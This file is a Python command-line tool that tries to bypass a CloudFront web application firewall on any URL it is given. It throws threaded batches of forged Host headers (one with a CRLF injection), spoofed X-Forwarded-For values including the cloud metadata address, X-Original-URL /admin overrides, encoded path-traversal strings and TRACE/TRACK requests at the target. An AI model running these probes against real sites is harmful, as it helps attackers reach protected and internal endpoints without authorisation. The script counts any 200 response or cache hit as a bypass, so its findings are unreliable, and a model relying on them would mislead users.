#!/usr/bin/env python3
"""
CloudFront WAF Bypass Scanner
"""
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import time


class CloudFrontBypasser:
    def __init__(self, target, threads=10, delay=0.2):
        self.target = target.rstrip('/')
        self.threads = threads
        self.delay = delay
        self.results = []
        
        # Parse target
        parsed = urlparse(self.target)
        self.domain = parsed.netloc
        self.scheme = parsed.scheme
        
    def scan(self):
        """Run all bypass techniques"""
        print(f"[*] Scanning {self.target}")
        
        techniques = [
            self._test_host_header_injection,
            self._test_x_forwarded_for,
            self._test_x_forwarded_host,
            self._test_x_original_url,
            self._test_cache_control,
            self._test_encoding_bypass,
            self._test_method_bypass,
            self._test_content_type_bypass,
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(technique) for technique in techniques]
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.results.extend(result)
                except Exception as e:
                    pass
        
        return self.results
    
    def _test_request(self, headers=None, method='GET', path='/'):
        """Test a single request configuration"""
        url = f"{self.target}{path}"
        
        try:
            if method == 'GET':
                resp = requests.get(url, headers=headers, timeout=5, allow_redirects=False)
            elif method == 'POST':
                resp = requests.post(url, headers=headers, timeout=5, allow_redirects=False)
            elif method == 'HEAD':
                resp = requests.head(url, headers=headers, timeout=5, allow_redirects=False)
            else:
                resp = requests.request(method, url, headers=headers, timeout=5, allow_redirects=False)
            
            time.sleep(self.delay)
            
            # Check if bypass succeeded
            bypass = self._is_bypass(resp)
            
            return {
                'bypass': bypass,
                'status': resp.status_code,
                'headers': headers or {},
                'method': method,
                'path': path,
                'size': len(resp.content),
                'technique': headers.get('X-Technique', 'Unknown') if headers else 'Unknown'
            }
        except Exception as e:
            return None
    
    def _is_bypass(self, response):
        """Determine if response indicates WAF bypass"""
        # Common bypass indicators
        if response.status_code == 200:
            return True
        if response.status_code in [301, 302, 307] and 'location' in response.headers:
            return True
        if 'x-cache' in response.headers and 'hit' in response.headers['x-cache'].lower():
            return True
        return False
    
    def _test_host_header_injection(self):
        """Test Host header manipulation"""
        results = []
        
        variations = [
            {'Host': 'localhost'},
            {'Host': '127.0.0.1'},
            {'Host': f'{self.domain}:80'},
            {'Host': f'{self.domain}:443'},
            {'Host': f'evil.com\r\nX-Injected: true'},
        ]
        
        for headers in variations:
            headers['X-Technique'] = 'Host Header Injection'
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
        
        return results
    
    def _test_x_forwarded_for(self):
        """Test X-Forwarded-For bypass"""
        results = []
        
        ips = ['127.0.0.1', '0.0.0.0', '10.0.0.1', '192.168.1.1', '169.254.169.254']
        
        for ip in ips:
            headers = {
                'X-Forwarded-For': ip,
                'X-Technique': f'X-Forwarded-For: {ip}'
            }
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
        
        return results
    
    def _test_x_forwarded_host(self):
        """Test X-Forwarded-Host bypass"""
        results = []
        
        hosts = ['localhost', '127.0.0.1', self.domain, 'evil.com']
        
        for host in hosts:
            headers = {
                'X-Forwarded-Host': host,
                'X-Technique': f'X-Forwarded-Host: {host}'
            }
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
        
        return results
    
    def _test_x_original_url(self):
        """Test X-Original-URL bypass"""
        results = []
        
        paths = ['/', '/admin', '/%2e%2e/', '/..;/']
        
        for path in paths:
            headers = {
                'X-Original-URL': path,
                'X-Technique': f'X-Original-URL: {path}'
            }
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
        
        return results
    
    def _test_cache_control(self):
        """Test Cache-Control bypass"""
        results = []
        
        cache_headers = [
            {'Cache-Control': 'no-cache'},
            {'Cache-Control': 'no-store'},
            {'Cache-Control': 'max-age=0'},
            {'Pragma': 'no-cache'},
        ]
        
        for headers in cache_headers:
            headers['X-Technique'] = f'Cache-Control: {list(headers.values())[0]}'
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
        
        return results
    
    def _test_encoding_bypass(self):
        """Test encoding bypass"""
        results = []
        
        paths = [
            '/',
            '/%2e/',
            '/..%2f',
            '/%252e%252e/',
            '/%u002e%u002e/',
        ]
        
        for path in paths:
            headers = {'X-Technique': f'Path Encoding: {path}'}
            result = self._test_request(headers, path=path)
            if result and result['bypass']:
                results.append(result)
        
        return results
    
    def _test_method_bypass(self):
        """Test HTTP method bypass"""
        results = []
        
        methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'TRACE', 'TRACK']
        
        for method in methods:
            headers = {'X-Technique': f'HTTP Method: {method}'}
            result = self._test_request(headers, method=method)
            if result and result['bypass']:
                results.append(result)
        
        return results
    
    def _test_content_type_bypass(self):
        """Test Content-Type bypass"""
        results = []
        
        content_types = [
            'application/json',
            'application/xml',
            'text/plain',
            'multipart/form-data',
        ]
        
        for ct in content_types:
            headers = {
                'Content-Type': ct,
                'X-Technique': f'Content-Type: {ct}'
            }
            result = self._test_request(headers, method='POST')
            if result and result['bypass']:
                results.append(result)
        
        return results


def main():
    """Standalone scanner"""
    from argparse import ArgumentParser
    import json
    
    parser = ArgumentParser(description='CloudFront WAF Bypass Scanner')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-d', '--delay', type=float, default=0.2, help='Delay between requests')
    parser.add_argument('-o', '--output', help='Output JSON file')
    args = parser.parse_args()
    
    scanner = CloudFrontBypasser(args.target, args.threads, args.delay)
    results = scanner.scan()
    
    print(f"\n[+] Found {len(results)} potential bypasses")
    
    for r in results:
        print(f"  [{r['status']}] {r['technique']}")
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\n[+] Results saved to {args.output}")


if __name__ == '__main__':
    main()